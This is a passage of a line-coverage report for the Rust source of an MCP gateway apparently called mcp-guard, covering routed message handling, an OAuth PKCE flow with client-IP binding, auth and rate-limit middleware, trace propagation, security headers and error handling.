  199|      0|        filter_tools_list_response(response, &identity)
  200|       |    } else {
  201|      0|        response
  202|       |    };
  203|       |
  204|      0|    Ok(Json(response))
  205|      0|}
  206|       |
  207|       |/// MCP message handler for multi-server routing (FR-AUTHZ-03 applies here too)
  208|       |/// Routes requests to different upstreams based on the server name in the path
  209|      0|async fn handle_routed_mcp_message(
  210|      0|    State(state): State<Arc<AppState>>,
  211|      0|    axum::extract::Path(server_name): axum::extract::Path<String>,
  212|      0|    axum::Extension(identity): axum::Extension<Identity>,
  213|      0|    Json(message): Json<Message>,
  214|      0|) -> Result<Json<Message>, AppError> {
  215|       |    // Get the router (multi-server mode)
  216|      0|    let router = state.router.as_ref().ok_or_else(|| {
  217|      0|        AppError::internal("No router configured (use single-server mode?)")
  218|      0|    })?;
  219|       |
  220|       |    // Build path for routing
  221|      0|    let path = format!("/{}", server_name);
  222|       |
  223|       |    // Get the transport for this path
  224|      0|    let transport = router.get_transport(&path).ok_or_else(|| {
  225|      0|        AppError::not_found(format!("No server route for path: {}", path))
  226|      0|    })?;
  227|       |
  228|      0|    tracing::debug!(
  229|       |        server = %server_name,
  230|      0|        route = ?router.get_route_name(&path),
  231|      0|        "Routing MCP message"
  232|       |    );
  233|       |
  234|       |    // Check if this is a tools/list request (for later filtering)
  235|      0|    let is_tools_list = is_tools_list_request(&message);
  236|       |
  237|       |    // Forward to upstream transport
  238|      0|    transport.send(message).await?;
  239|       |
  240|       |    // Wait for response
  241|      0|    let response = transport.receive().await?;
  242|       |
  243|       |    // Filter tools/list response to only show authorized tools
  244|      0|    let response = if is_tools_list {
  245|      0|        filter_tools_list_response(response, &identity)
  246|       |    } else {
  247|      0|        response
  248|       |    };
  249|       |
  250|      0|    Ok(Json(response))
  251|      0|}
  252|       |
  253|       |// ============================================================================
  254|       |// OAuth 2.1 Authorization Code Flow with PKCE (FR-AUTH-05)
  255|       |// ============================================================================
  256|       |
  257|       |/// Generate a cryptographically secure random string using OsRng and base64url encoding.
  258|       |///
  259|       |/// SECURITY: Uses OsRng (operating system's cryptographic RNG) instead of thread_rng
  260|       |/// for better entropy. Base64url encoding provides ~6 bits per character (vs ~5.95
  261|       |/// for charset-based approach), resulting in higher entropy per character.
  262|      9|fn generate_random_string(len: usize) -> String {
  263|       |    use base64::Engine;
  264|       |    use rand::RngCore;
  265|       |    use rand::rngs::OsRng;
  266|       |
  267|       |    // Calculate bytes needed: base64 encodes 3 bytes to 4 chars
  268|       |    // We need enough bytes to produce at least `len` characters
  269|      9|    let bytes_needed = (len * 3 + 3) / 4;
  270|      9|    let mut bytes = vec![0u8; bytes_needed];
  271|      9|    OsRng.fill_bytes(&mut bytes);
  272|       |
  273|       |    // Encode with URL-safe base64 and truncate to desired length
  274|      9|    let encoded = base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(&bytes);
  275|      9|    encoded[..len].to_string()
  276|      9|}
  277|       |
  278|       |/// Generate PKCE code verifier and challenge
  279|      3|fn generate_pkce() -> (String, String) {
  280|       |    use sha2::{Digest, Sha256};
  281|       |
  282|       |    // Generate a random 43-128 character code verifier
  283|      3|    let code_verifier = generate_random_string(64);
  284|       |
  285|       |    // Create SHA-256 hash and base64url encode it
  286|      3|    let mut hasher = Sha256::new();
  287|      3|    hasher.update(code_verifier.as_bytes());
  288|      3|    let hash = hasher.finalize();
  289|      3|    let code_challenge = base64::Engine::encode(
  290|      3|        &base64::engine::general_purpose::URL_SAFE_NO_PAD,
  291|      3|        hash,
  292|       |    );
  293|       |
  294|      3|    (code_verifier, code_challenge)
  295|      3|}
  296|       |
  297|       |/// Clean up expired OAuth states (older than 10 minutes)
  298|      2|fn cleanup_expired_oauth_states(store: &OAuthStateStore) {
  299|      2|    let expiry = Duration::from_secs(OAUTH_STATE_EXPIRY_SECS);
  300|      2|    store.retain(|_, state| state.created_at.elapsed() < expiry);
                                          ^1                           ^1
  301|      2|}
  302|       |
  303|       |/// OAuth authorize endpoint - initiates the OAuth flow
  304|       |/// Initiate OAuth authorization flow with PKCE.
  305|       |///
  306|       |/// SECURITY: Binds the OAuth state to the client IP to prevent state fixation attacks.
  307|       |/// Also enforces a limit on pending states to prevent DoS attacks.
  308|      1|async fn oauth_authorize(
  309|      1|    State(state): State<Arc<AppState>>,
  310|      1|    ConnectInfo(addr): ConnectInfo<std::net::SocketAddr>,
  311|      1|) -> Result<impl IntoResponse, AppError> {
  312|      1|    let oauth_provider = state
  313|      1|        .oauth_provider
  314|      1|        .as_ref()
  315|      1|        .ok_or_else(|| AppError::internal("OAuth not configured"))?;
                                     ^0                                         ^0
  316|       |
  317|       |    // SECURITY: Cleanup expired states first, then check the limit
  318|      1|    cleanup_expired_oauth_states(&state.oauth_state_store);
  319|       |
  320|       |    // SECURITY: Prevent DoS by limiting the number of pending OAuth states
  321|      1|    if state.oauth_state_store.len() >= MAX_PENDING_OAUTH_STATES {
  322|      0|        tracing::warn!(
  323|      0|            current_count = state.oauth_state_store.len(),
  324|       |            max_allowed = MAX_PENDING_OAUTH_STATES,
  325|      0|            "OAuth state store at capacity - possible DoS attack"
  326|       |        );
  327|       |        // Return rate limited with a 60 second retry-after
  328|      0|        return Err(AppError::rate_limited(Some(60)));
  329|      1|    }
  330|       |
  331|       |    // Generate PKCE code verifier and challenge
  332|      1|    let (code_verifier, code_challenge) = generate_pkce();
  333|       |
  334|       |    // Generate random state parameter
  335|      1|    let oauth_state = generate_random_string(32);
  336|       |
  337|       |    // SECURITY: Bind the state to the client IP to prevent state fixation attacks
  338|      1|    let client_ip = addr.ip();
  339|       |
  340|       |    // Store the code verifier with the state and client IP binding
  341|      1|    state.oauth_state_store.insert(
  342|      1|        oauth_state.clone(),
  343|      1|        PkceState {
  344|      1|            code_verifier,
  345|      1|            created_at: Instant::now(),
  346|      1|            client_ip,
  347|      1|        },
  348|      1|    );
  349|       |
  350|       |    // Build authorization URL
  351|      1|    let auth_url = oauth_provider.get_authorization_url(&oauth_state, Some(&code_challenge));
  352|       |
  353|      1|    tracing::info!(
  354|       |        client_ip = %client_ip,
  355|      0|        pending_states = state.oauth_state_store.len(),
  356|      0|        "Initiating OAuth flow with state: {}",
  357|       |        oauth_state
  358|       |    );
  359|       |
  360|      1|    Ok(Redirect::temporary(&auth_url))
  361|      1|}
  362|       |
  363|       |/// Query parameters for OAuth callback
  364|       |#[derive(Debug, serde::Deserialize)]
  365|       |pub struct OAuthCallbackParams {
  366|       |    pub code: Option<String>,
  367|       |    pub state: Option<String>,
  368|       |    pub error: Option<String>,
  369|       |    pub error_description: Option<String>,
  370|       |}
  371|       |
  372|       |/// OAuth token response
  373|       |#[derive(Debug, serde::Serialize)]
  374|       |struct OAuthTokenResponse {
  375|       |    access_token: String,
  376|       |    token_type: String,
  377|       |    expires_in: Option<u64>,
  378|       |    refresh_token: Option<String>,
  379|       |    scope: Option<String>,
  380|       |}
  381|       |
  382|       |/// OAuth callback endpoint - exchanges authorization code for tokens.
  383|       |///
  384|       |/// SECURITY: Validates that the client IP matches the IP that initiated the OAuth flow
  385|       |/// to prevent state fixation attacks.
  386|      3|async fn oauth_callback(
  387|      3|    State(state): State<Arc<AppState>>,
  388|      3|    ConnectInfo(addr): ConnectInfo<std::net::SocketAddr>,
  389|      3|    Query(params): Query<OAuthCallbackParams>,
  390|      3|) -> Result<impl IntoResponse, AppError> {
  391|       |    // Check for errors from OAuth provider
  392|      3|    if let Some(error) = params.error {
                              ^1
  393|      1|        let description = params.error_description.unwrap_or_default();
  394|      1|        tracing::warn!("OAuth error: {} - {}", error, description);
                                     ^0
  395|      1|        return Err(AppError::unauthorized(format!(
  396|      1|            "OAuth error: {} - {}",
  397|      1|            error, description
  398|      1|        )));
  399|      2|    }
  400|       |
  401|       |    // Validate state parameter
  402|      2|    let oauth_state = params
                      ^1
  403|      2|        .state
  404|      2|        .ok_or_else(|| AppError::unauthorized("Missing state parameter"))?;
                                     ^1                                                ^1
  405|       |
  406|       |    // Retrieve and remove PKCE state
  407|      1|    let pkce_state = state
                      ^0
  408|      1|        .oauth_state_store
  409|      1|        .remove(&oauth_state)
  410|      1|        .map(|(_, v)| v)
  411|      1|        .ok_or_else(|| AppError::unauthorized("Invalid or expired state"))?;
  412|       |
  413|       |    // Validate state hasn't expired (10 minute limit)
  414|      0|    if pkce_state.created_at.elapsed() > Duration::from_secs(OAUTH_STATE_EXPIRY_SECS) {
  415|      0|        return Err(AppError::unauthorized("OAuth state expired"));
  416|      0|    }
  417|       |
  418|       |    // SECURITY: Validate client IP binding to prevent state fixation attacks
  419|      0|    let callback_ip = addr.ip();
  420|      0|    if pkce_state.client_ip != callback_ip {
  421|      0|        tracing::warn!(
  422|       |            expected_ip = %pkce_state.client_ip,
  423|       |            actual_ip = %callback_ip,
  424|      0|            "OAuth callback IP mismatch - possible state fixation attack"
  425|       |        );
  426|      0|        return Err(AppError::unauthorized("OAuth state binding mismatch"));
  427|      0|    }
  428|       |
  429|       |    // Get authorization code
  430|      0|    let code = params
  431|      0|        .code
  432|      0|        .ok_or_else(|| AppError::unauthorized("Missing authorization code"))?;
  433|       |
  434|       |    // Get OAuth provider
  435|      0|    let oauth_provider = state
  436|      0|        .oauth_provider
  437|      0|        .as_ref()
  438|      0|        .ok_or_else(|| AppError::internal("OAuth not configured"))?;
  439|       |
  440|       |    // Exchange code for tokens
  441|      0|    let tokens = exchange_code_for_tokens(
  442|      0|        &state.config,
  443|      0|        oauth_provider,
  444|      0|        &code,
  445|      0|        &pkce_state.code_verifier,
  446|      0|    )
  447|      0|    .await?;
  448|       |
  449|      0|    tracing::info!("OAuth code exchange successful");
  450|       |
  451|      0|    Ok(Json(tokens))
  452|      3|}
  453|       |
  454|       |/// Exchange authorization code for tokens
  455|      0|async fn exchange_code_for_tokens(
  456|      0|    config: &Config,
  457|      0|    oauth_provider: &OAuthAuthProvider,
  458|      0|    code: &str,
  459|      0|    code_verifier: &str,
  460|      0|) -> Result<OAuthTokenResponse, AppError> {
  461|      0|    let oauth_config = config
  462|      0|        .auth
  463|      0|        .oauth
  464|      0|        .as_ref()
  465|      0|        .ok_or_else(|| AppError::internal("OAuth not configured"))?;
  466|       |
  467|       |    // Build token request
  468|      0|    let client = reqwest::Client::new();
  469|      0|    let mut form = vec![
  470|      0|        ("grant_type", "authorization_code"),
  471|      0|        ("code", code),
  472|      0|        ("redirect_uri", &oauth_config.redirect_uri),
  473|      0|        ("client_id", &oauth_config.client_id),
  474|      0|        ("code_verifier", code_verifier),
  475|       |    ];
  476|       |
  477|       |    // Add client_secret for confidential clients
  478|       |    let client_secret;
  479|      0|    if let Some(ref secret) = oauth_config.client_secret {
  480|      0|        client_secret = secret.clone();
  481|      0|        form.push(("client_secret", &client_secret));
  482|      0|    }
  483|       |
  484|      0|    let response = client
  485|      0|        .post(oauth_provider.token_url())
  486|      0|        .header("Accept", "application/json")
  487|      0|        .form(&form)
  488|      0|        .send()
  489|      0|        .await
  490|      0|        .map_err(|e| AppError::internal(format!("Token exchange request failed: {}", e)))?;
  491|       |
  492|      0|    if !response.status().is_success() {
  493|      0|        let status = response.status();
  494|      0|        let body = response.text().await.unwrap_or_default();
  495|      0|        tracing::error!("Token exchange failed: {} - {}", status, body);
  496|      0|        return Err(AppError::unauthorized(format!(
  497|      0|            "Token exchange failed: {}",
  498|      0|            status
  499|      0|        )));
  500|      0|    }
  501|       |
  502|      0|    let token_response: serde_json::Value = response
  503|      0|        .json()
  504|      0|        .await
  505|      0|        .map_err(|e| AppError::internal(format!("Failed to parse token response: {}", e)))?;
  506|       |
  507|      0|    let access_token = token_response
  508|      0|        .get("access_token")
  509|      0|        .and_then(|v| v.as_str())
  510|      0|        .ok_or_else(|| AppError::internal("No access_token in response"))?
  511|      0|        .to_string();
  512|       |
  513|      0|    let token_type = token_response
  514|      0|        .get("token_type")
  515|      0|        .and_then(|v| v.as_str())
  516|      0|        .unwrap_or("Bearer")
  517|      0|        .to_string();
  518|       |
  519|      0|    let expires_in = token_response
  520|      0|        .get("expires_in")
  521|      0|        .and_then(|v| v.as_u64());
  522|       |
  523|      0|    let refresh_token = token_response
  524|      0|        .get("refresh_token")
  525|      0|        .and_then(|v| v.as_str())
  526|      0|        .map(String::from);
  527|       |
  528|      0|    let scope = token_response
  529|      0|        .get("scope")
  530|      0|        .and_then(|v| v.as_str())
  531|      0|        .map(String::from);
  532|       |
  533|      0|    Ok(OAuthTokenResponse {
  534|      0|        access_token,
  535|      0|        token_type,
  536|      0|        expires_in,
  537|      0|        refresh_token,
  538|      0|        scope,
  539|      0|    })
  540|      0|}
  541|       |
  542|       |use crate::rate_limit::RateLimitResult;
  543|       |
  544|       |/// Authentication middleware with metrics
  545|       |///
  546|       |/// Supports multiple authentication methods in order of preference:
  547|       |/// 1. mTLS: Client certificate info from headers (X-Client-Cert-CN, etc.)
  548|       |///    SECURITY: Only accepted from trusted proxy IPs configured in `trusted_proxy_ips`
  549|       |/// 2. Bearer token: Authorization header with Bearer token (API key, JWT, OAuth)
  550|      2|pub async fn auth_middleware(
  551|      2|    State(state): State<Arc<AppState>>,
  552|      2|    ConnectInfo(addr): ConnectInfo<std::net::SocketAddr>,
  553|      2|    mut request: Request<Body>,
  554|      2|    next: Next,
  555|      2|) -> Result<Response, AppError> {
  556|       |    // Try mTLS authentication first (if configured and headers present)
  557|      2|    if let Some(ref mtls_provider) = state.mtls_provider {
                              ^0
  558|       |        // SECURITY: Use the secure method that validates client IP
  559|      0|        let client_ip = addr.ip();
  560|      0|        if let Some(cert_info) = ClientCertInfo::from_headers_if_trusted(
  561|      0|            request.headers(),
  562|      0|            &client_ip,
  563|      0|            mtls_provider,
  564|      0|        ) {
  565|      0|            if cert_info.verified || cert_info.common_name.is_some() {
  566|      0|                match mtls_provider.extract_identity(&cert_info) {
  567|      0|                    Ok(identity) => {
  568|      0|                        record_auth("mtls", true);
  569|      0|                        state.audit_logger.log_auth_success(&identity.id);
  570|       |
  571|       |                        // Check rate limit
  572|      0|                        let rate_limit_result =
  573|      0|                            state.rate_limiter.check(&identity.id, identity.rate_limit);
  574|      0|                        record_rate_limit(rate_limit_result.allowed);
  575|       |
  576|      0|                        if !rate_limit_result.allowed {
  577|      0|                            state.audit_logger.log_rate_limited(&identity.id);
  578|      0|                            return Err(AppError::rate_limited_with_info(rate_limit_result));
  579|      0|                        }
  580|       |
  581|      0|                        request.extensions_mut().insert(identity);
  582|      0|                        let mut response = next.run(request).await;
  583|      0|                        add_rate_limit_headers_from_result(&mut response, &rate_limit_result);
  584|      0|                        return Ok(response);
  585|       |                    }
  586|      0|                    Err(e) => {
  587|      0|                        record_auth("mtls", false);
  588|      0|                        tracing::debug!("mTLS auth failed, falling back to bearer: {}", e);
  589|       |                        // Fall through to bearer token auth
  590|       |                    }
  591|       |                }
  592|      0|            }
  593|      0|        }
  594|      2|    }
  595|       |
  596|       |    // Fall back to Bearer token authentication
  597|      2|    let token = request
                      ^0
  598|      2|        .headers()
  599|      2|        .get("Authorization")
  600|      2|        .and_then(|v| v.to_str().ok())
                                    ^0^0       ^0
  601|      2|        .and_then(|s| s.strip_prefix("Bearer "))
                                    ^0^0
  602|      2|        .ok_or_else(|| AppError::unauthorized("Missing authorization header"))?;
  603|       |
  604|       |    // Get provider name for metrics
  605|      0|    let provider_name = state.auth_provider.name().to_string();
  606|       |
  607|       |    // Authenticate
  608|      0|    let identity = match state.auth_provider.authenticate(token).await {
  609|      0|        Ok(identity) => {
  610|      0|            record_auth(&provider_name, true);
  611|      0|            state.audit_logger.log_auth_success(&identity.id);
  612|      0|            identity
  613|       |        }
  614|      0|        Err(e) => {
  615|      0|            record_auth(&provider_name, false);
  616|      0|            state.audit_logger.log_auth_failure(&e.to_string());
  617|      0|            return Err(AppError::unauthorized(e.to_string()));
  618|       |        }
  619|       |    };
  620|       |
  621|       |    // Check rate limit (per-identity)
  622|      0|    let rate_limit_result = state.rate_limiter.check(&identity.id, identity.rate_limit);
  623|      0|    record_rate_limit(rate_limit_result.allowed);
  624|       |
  625|      0|    if !rate_limit_result.allowed {
  626|      0|        state.audit_logger.log_rate_limited(&identity.id);
  627|      0|        return Err(AppError::rate_limited_with_info(rate_limit_result));
  628|      0|    }
  629|       |
  630|       |    // Add identity to request extensions
  631|      0|    request.extensions_mut().insert(identity);
  632|       |
  633|       |    // Run the request and add rate limit headers to response
  634|      0|    let mut response = next.run(request).await;
  635|      0|    add_rate_limit_headers_from_result(&mut response, &rate_limit_result);
  636|      0|    Ok(response)
  637|      2|}
  638|       |
  639|       |/// Add rate limit headers to a response
  640|       |///
  641|       |/// Headers added (per RFC 6585 and draft-ietf-httpapi-ratelimit-headers):
  642|       |/// - `X-RateLimit-Limit`: The maximum number of requests allowed per second
  643|       |/// - `X-RateLimit-Remaining`: Approximate remaining requests in current window
  644|       |/// - `X-RateLimit-Reset`: Unix timestamp when the rate limit resets
  645|      0|fn add_rate_limit_headers_from_result(response: &mut Response, rate_limit: &RateLimitResult) {
  646|      0|    let headers = response.headers_mut();
  647|       |
  648|      0|    if let Ok(limit) = HeaderValue::from_str(&rate_limit.limit.to_string()) {
  649|      0|        headers.insert(HeaderName::from_static("x-ratelimit-limit"), limit);
  650|      0|    }
  651|      0|    if let Ok(remaining) = HeaderValue::from_str(&rate_limit.remaining.to_string()) {
  652|      0|        headers.insert(HeaderName::from_static("x-ratelimit-remaining"), remaining);
  653|      0|    }
  654|      0|    if let Ok(reset) = HeaderValue::from_str(&rate_limit.reset_at.to_string()) {
  655|      0|        headers.insert(HeaderName::from_static("x-ratelimit-reset"), reset);
  656|      0|    }
  657|      0|}
  658|       |
  659|       |/// Middleware for recording request duration metrics
  660|     12|pub async fn metrics_middleware(request: Request<Body>, next: Next) -> Response {
  661|     12|    let method = request.method().to_string();
  662|     12|    let start = Instant::now();
  663|       |
  664|     12|    let response = next.run(request).await;
  665|       |
  666|     12|    let duration = start.elapsed();
  667|     12|    let status = response.status().as_u16();
  668|     12|    record_request(&method, status, duration);
  669|       |
  670|     12|    response
  671|     12|}
  672|       |
  673|       |/// Header extractor for W3C trace context propagation
  674|       |struct HeaderExtractor<'a>(&'a HeaderMap);
  675|       |
  676|       |impl opentelemetry::propagation::Extractor for HeaderExtractor<'_> {
  677|     16|    fn get(&self, key: &str) -> Option<&str> {
  678|     16|        self.0.get(key).and_then(|v| v.to_str().ok())
                                                   ^2^2       ^2
  679|     16|    }
  680|       |
  681|      1|    fn keys(&self) -> Vec<&str> {
  682|      2|        self.0.keys().map(|k| k.as_str()).collect()
                      ^1     ^1     ^1                  ^1
  683|      1|    }
  684|       |}
  685|       |
  686|       |/// Header injector for W3C trace context propagation
  687|       |struct HeaderInjector<'a>(&'a mut HeaderMap);
  688|       |
  689|       |impl opentelemetry::propagation::Injector for HeaderInjector<'_> {
  690|      1|    fn set(&mut self, key: &str, value: String) {
  691|      1|        if let Ok(header_name) = header::HeaderName::from_bytes(key.as_bytes()) {
  692|      1|            if let Ok(header_value) = header::HeaderValue::from_str(&value) {
  693|      1|                self.0.insert(header_name, header_value);
  694|      1|            }
                          ^0
  695|      0|        }
  696|      1|    }
  697|       |}
  698|       |
  699|       |/// Middleware for W3C trace context propagation (FR-OBS-03)
  700|       |///
  701|       |/// Extracts W3C traceparent and tracestate headers from incoming requests
  702|       |/// and sets them on the current tracing span. Also propagates trace context
  703|       |/// to downstream requests.
  704|     13|pub async fn trace_context_middleware(request: Request<Body>, next: Next) -> Response {
  705|       |    // Extract trace context from incoming headers
  706|     13|    let propagator = TraceContextPropagator::new();
  707|     13|    let parent_context = propagator.extract(&HeaderExtractor(request.headers()));
  708|       |
  709|       |    // Create a new span for this request with the extracted context
  710|     13|    let span = tracing::info_span!(
  711|       |        "http_request",
  712|     12|        method = %request.method(),
  713|     12|        uri = %request.uri(),
  714|       |        trace_id = tracing::field::Empty,
  715|       |    );
  716|       |
  717|       |    // Set the parent context on the span
  718|     13|    span.set_parent(parent_context);
  719|       |
  720|       |    // Record trace_id in the span (for logs)
  721|     13|    if let Some(trace_id) = crate::observability::current_trace_id() {
                              ^0
  722|      0|        span.record("trace_id", &trace_id);
  723|     13|    }
  724|       |
  725|       |    // Execute the request within the span
  726|     13|    let _guard = span.enter();
  727|     13|    let mut response = next.run(request).await;
  728|       |
  729|       |    // Optionally inject trace context into response headers (for debugging)
  730|       |    // This allows clients to correlate their requests with our traces
  731|     13|    let current_span = tracing::Span::current();
  732|     13|    let context = current_span.context();
  733|     13|    propagator.inject_context(&context, &mut HeaderInjector(response.headers_mut()));
  734|       |
  735|     13|    response
  736|     13|}
  737|       |
  738|       |/// Middleware that adds security headers to all responses.
  739|       |///
  740|       |/// Headers added:
  741|       |/// - `X-Content-Type-Options: nosniff` - Prevents MIME-sniffing attacks
  742|       |/// - `X-Frame-Options: DENY` - Prevents clickjacking via iframe embedding
  743|       |/// - `X-XSS-Protection: 1; mode=block` - Enables browser XSS filtering (legacy browsers)
  744|       |/// - `Content-Security-Policy: default-src 'none'` - Strict CSP for API responses
  745|       |///
  746|       |/// These headers provide defense-in-depth for security even though
  747|       |/// mcp-guard is primarily an API server (not serving HTML).
  748|     13|pub async fn security_headers_middleware(request: Request<Body>, next: Next) -> Response {
  749|     13|    let mut response = next.run(request).await;
  750|       |
  751|     13|    let headers = response.headers_mut();
  752|       |
  753|       |    // Prevent MIME-sniffing attacks
  754|     13|    headers.insert(
  755|     13|        header::X_CONTENT_TYPE_OPTIONS,
  756|     13|        HeaderValue::from_static("nosniff"),
  757|       |    );
  758|       |
  759|       |    // Prevent clickjacking via iframe embedding
  760|     13|    headers.insert(
  761|     13|        header::X_FRAME_OPTIONS,
  762|     13|        HeaderValue::from_static("DENY"),
  763|       |    );
  764|       |
  765|       |    // Enable browser XSS filtering (for legacy browsers)
  766|     13|    headers.insert(
  767|     13|        HeaderName::from_static("x-xss-protection"),
  768|     13|        HeaderValue::from_static("1; mode=block"),
  769|       |    );
  770|       |
  771|       |    // Strict Content-Security-Policy for API responses
  772|       |    // Since we don't serve HTML, we use the strictest possible policy
  773|     13|    headers.insert(
  774|     13|        header::CONTENT_SECURITY_POLICY,
  775|     13|        HeaderValue::from_static("default-src 'none'"),
  776|       |    );
  777|       |
  778|     13|    response
  779|     13|}
  780|       |
  781|       |/// Application error type with unique error ID for correlation
  782|       |#[derive(Debug)]
  783|       |pub struct AppError {
  784|       |    /// Unique error ID for correlation across logs and responses
  785|       |    pub error_id: String,
  786|       |    /// The actual error kind
  787|       |    pub kind: AppErrorKind,
  788|       |}
  789|       |
  790|       |/// Application error variants
  791|       |#[derive(Debug)]
  792|       |pub enum AppErrorKind {
  793|       |    Unauthorized(String),
  794|       |    Forbidden(String),
  795|       |    NotFound(String),
  796|       |    RateLimited {
  797|       |        retry_after_secs: Option<u64>,
  798|       |        limit: Option<u32>,
  799|       |        remaining: Option<u32>,
  800|       |        reset_at: Option<u64>,
  801|       |    },
  802|       |    Transport(crate::transport::TransportError),
  803|       |    Internal(String),
  804|       |}
  805|       |
  806|       |impl AppError {
  807|       |    /// Create a new error with a unique ID
  808|     21|    fn new(kind: AppErrorKind) -> Self {
  809|     21|        let error_id = uuid::Uuid::new_v4().to_string();
  810|     21|        Self { error_id, kind }
  811|     21|    }
  812|       |
  813|       |    /// Create an Unauthorized error
  814|      7|    pub fn unauthorized(msg: impl Into<String>) -> Self {
  815|      7|        Self::new(AppErrorKind::Unauthorized(msg.into()))
  816|      7|    }
  817|       |
  818|       |    /// Create a Forbidden error
  819|      3|    pub fn forbidden(msg: impl Into<String>) -> Self {
  820|      3|        Self::new(AppErrorKind::Forbidden(msg.into()))
  821|      3|    }
  822|       |
  823|       |    /// Create a NotFound error
  824|      3|    pub fn not_found(msg: impl Into<String>) -> Self {
  825|      3|        Self::new(AppErrorKind::NotFound(msg.into()))
  826|      3|    }
  827|       |
  828|       |    /// Create a RateLimited error
  829|      2|    pub fn rate_limited(retry_after_secs: Option<u64>) -> Self {
  830|      2|        Self::new(AppErrorKind::RateLimited {
  831|      2|            retry_after_secs,
  832|      2|            limit: None,
  833|      2|            remaining: None,
  834|      2|            reset_at: None,
  835|      2|        })
  836|      2|    }
  837|       |
  838|       |    /// Create a RateLimited error with full rate limit info
  839|      0|    pub fn rate_limited_with_info(rate_limit: RateLimitResult) -> Self {
  840|      0|        Self::new(AppErrorKind::RateLimited {
  841|      0|            retry_after_secs: rate_limit.retry_after_secs,
  842|      0|            limit: Some(rate_limit.limit),
  843|      0|            remaining: Some(rate_limit.remaining),
  844|      0|            reset_at: Some(rate_limit.reset_at),
  845|      0|        })
  846|      0|    }
  847|       |
  848|       |    /// Create a Transport error
  849|      3|    pub fn transport(e: crate::transport::TransportError) -> Self {
  850|      3|        Self::new(AppErrorKind::Transport(e))
  851|      3|    }
  852|       |
  853|       |    /// Create an Internal error
  854|      3|    pub fn internal(msg: impl Into<String>) -> Self {
  855|      3|        Self::new(AppErrorKind::Internal(msg.into()))
  856|      3|    }
  857|       |}
  858|       |
  859|       |impl From<crate::transport::TransportError> for AppError {
  860|      0|    fn from(e: crate::transport::TransportError) -> Self {
  861|      0|        AppError::transport(e)
  862|      0|    }
  863|       |}
  864|       |
  865|       |impl IntoResponse for AppError {
  866|     16|    fn into_response(self) -> Response {
  867|     16|        let error_id = self.error_id.clone();
  868|       |
  869|     16|        match self.kind {
  870|      6|            AppErrorKind::Unauthorized(msg) => {
  871|      6|                tracing::warn!(error_id = %error_id, error = %msg, "Authentication failed");
                                                                                 ^0
  872|      6|                let body = serde_json::json!({
  873|      6|                    "error": msg,
  874|      6|                    "error_id": error_id
  875|       |                });
  876|      6|                (StatusCode::UNAUTHORIZED, Json(body)).into_response()
  877|       |            }
  878|      2|            AppErrorKind::Forbidden(msg) => {
  879|      2|                tracing::warn!(error_id = %error_id, error = %msg, "Authorization denied");
                                                                                 ^0
  880|      2|                let body = serde_json::json!({
  881|      2|                    "error": msg,
  882|      2|                    "error_id": error_id
  883|       |                });
  884|      2|                (StatusCode::FORBIDDEN, Json(body)).into_response()
  885|       |            }
  886|      2|            AppErrorKind::NotFound(msg) => {
  887|      2|                tracing::debug!(error_id = %error_id, error = %msg, "Resource not found");
                                                                                  ^0
  888|      2|                let body = serde_json::json!({
  889|      2|                    "error": msg,
  890|      2|                    "error_id": error_id
  891|       |                });
  892|      2|                (StatusCode::NOT_FOUND, Json(body)).into_response()
  893|       |            }
  894|      1|            AppErrorKind::RateLimited { retry_after_secs, limit, remaining, reset_at } => {
  895|      1|                let retry_after = retry_after_secs.unwrap_or(1);
  896|      1|                tracing::debug!(error_id = %error_id, retry_after = retry_after, "Rate limit exceeded");
                                                                                               ^0
  897|      1|                let body = serde_json::json!({
  898|      1|                    "error": "Rate limit exceeded",
  899|      1|                    "retry_after": retry_after,
  900|      1|                    "error_id": error_id
  901|       |                });
  902|       |
  903|       |                // Build response with all rate limit headers (FR-RATE-05 + P1 enhancements)
  904|      1|                let mut response = (StatusCode::TOO_MANY_REQUESTS, Json(body)).into_response();
  905|      1|                let headers = response.headers_mut();
  906|       |
  907|       |                // Retry-After header (required by RFC 6585)
  908|      1|                if let Ok(val) = HeaderValue::from_str(&retry_after.to_string()) {
  909|      1|                    headers.insert(header::RETRY_AFTER, val);
  910|      1|                }
                              ^0
  911|       |
  912|       |                // X-RateLimit-* headers (draft-ietf-httpapi-ratelimit-headers)
  913|      1|                if let Some(l) = limit {
                                          ^0
  914|      0|                    if let Ok(val) = HeaderValue::from_str(&l.to_string()) {
  915|      0|                        headers.insert(HeaderName::from_static("x-ratelimit-limit"), val);
  916|      0|                    }
  917|      1|                }
  918|      1|                if let Some(r) = remaining {
                                          ^0
  919|      0|                    if let Ok(val) = HeaderValue::from_str(&r.to_string()) {
  920|      0|                        headers.insert(HeaderName::from_static("x-ratelimit-remaining"), val);
  921|      0|                    }
  922|      1|                }
  923|      1|                if let Some(reset) = reset_at {
                                          ^0
  924|      0|                    if let Ok(val) = HeaderValue::from_str(&reset.to_string()) {
  925|      0|                        headers.insert(HeaderName::from_static("x-ratelimit-reset"), val);
  926|      0|                    }
  927|      1|                }
  928|       |
  929|      1|                response
  930|       |            }
  931|      3|            AppErrorKind::Transport(e) => {
  932|       |                // Log the full error internally for debugging, but return sanitized message
  933|      3|                tracing::error!(
  934|       |                    error_id = %error_id,
  935|       |                    error = %e,
  936|      0|                    "Upstream transport error"
  937|       |                );
  938|       |                // Sanitize: don't expose internal paths, commands, or detailed error messages
  939|      3|                let sanitized_msg = match &e {
  940|      2|                    crate::transport::TransportError::Timeout => "Upstream request timed out",
  941|      1|                    crate::transport::TransportError::ConnectionClosed => "Upstream connection closed",
  942|      0|                    crate::transport::TransportError::ProcessExited => "Upstream process unavailable",
  943|      0|                    _ => "Upstream communication error",
  944|       |                };
  945|      3|                let body = serde_json::json!({
  946|      3|                    "error": sanitized_msg,
  947|      3|                    "error_id": error_id
  948|       |                });
  949|      3|                (StatusCode::BAD_GATEWAY, Json(body)).into_response()
  950|       |            }
  951|      2|            AppErrorKind::Internal(msg) => {
  952|       |                // Log the full message internally but return generic message to client
  953|      2|                tracing::error!(error_id = %error_id, error = %msg, "Internal server error");
                                                                                  ^0
  954|      2|                let body = serde_json::json!({
  955|      2|                    "error": "Internal server error",
  956|      2|                    "error_id": error_id
  957|       |                });
  958|      2|                (StatusCode::INTERNAL_SERVER_ERROR, Json(body)).into_response()
  959|       |            }
  960|       |        }
  961|     16|    }
  962|       |}
  963|       |
  964|       |/// Build the application router
  965|     11|pub fn build_router(state: Arc<AppState>) -> Router {
  966|       |    // Determine if we're in multi-server mode
  967|     11|    let is_multi_server = state.router.is_some();
  968|       |
  969|       |    // Build protected routes based on mode
  970|     11|    let protected_routes = if is_multi_server {
